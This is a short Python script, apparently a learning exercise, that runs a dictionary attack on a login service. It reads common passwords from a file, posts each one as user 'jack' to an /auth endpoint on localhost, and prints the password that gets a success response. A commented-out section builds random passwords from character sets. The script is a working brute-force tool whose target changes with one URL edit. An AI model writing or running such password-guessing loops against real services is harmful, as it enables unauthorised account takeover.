import random
import requests

with open('db.txt') as f:
    pop_p_data = f.read()
    pop_ps = pop_p_data.split('\n')

i = 0
def gen_b_p():
    global i
    if i>=len(pop_ps):
        return
    p = pop_ps[i]
    i += 1
    return p

def gen_good_password(l,c):
    d=''
    for i in range(l):
        r=random.choice(c)
        if r not in d:
            d +=r
    return d
 

while True:
    pas = gen_b_p()
    if pas is None: break
    data ={'login':'jack','password':pas}
    res=requests.post('http://localhost:5000/auth', json=data)
    if res.status_code == 200:
        print('success', pas)
        break

##    print(str(i)+gen_b_p()
##        +gen_good_password(3, 'auoei')
##       +gen_good_password(2, 'yzxcvbnmsdfghjklqwrtyp')
##       +gen_good_password(3, 'auoei')
##       +gen_good_password(3, ('yzxcvbnmsdfghjklqwrtyp')[::-1])
##       +gen_good_password(5, 'auoei')
##       +gen_good_password(3, ('yzxcvbnmsdfghjklqwrtyp'))
##       +gen_good_password(5, '1234567890'))
